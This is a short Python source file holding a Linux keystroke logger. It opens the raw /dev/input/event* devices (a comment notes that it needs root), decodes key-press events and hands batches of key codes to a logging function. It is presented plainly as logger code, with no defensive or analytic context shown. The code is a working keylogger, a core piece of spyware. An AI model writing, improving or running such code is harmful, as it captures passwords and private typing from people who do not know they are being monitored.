import struct, glob
from utils import finalize_log

def run_linux_logger(stop_event):
    buffer = []
    # Targeting the hardware event stream - requires root
    devices = glob.glob("/dev/input/event*")
    
    for device in devices:
        try:
            with open(device, "rb") as f:
                while not stop_event.is_set():
                    event = f.read(24)
                    if not event: continue
                    _, _, type, code, value = struct.unpack('llHHi', event)
                    # Type 1 = Key, Value 1 = Press
                    if type == 1 and value == 1:
                        buffer.append(str(code))
                        if len(buffer) >= 20: 
                            finalize_log(" ".join(buffer))
                            buffer.clear()
        except (PermissionError, IOError):
            continue
    
    # Ensure remaining data is written upon suspension
    if buffer: finalize_log(" ".join(buffer))
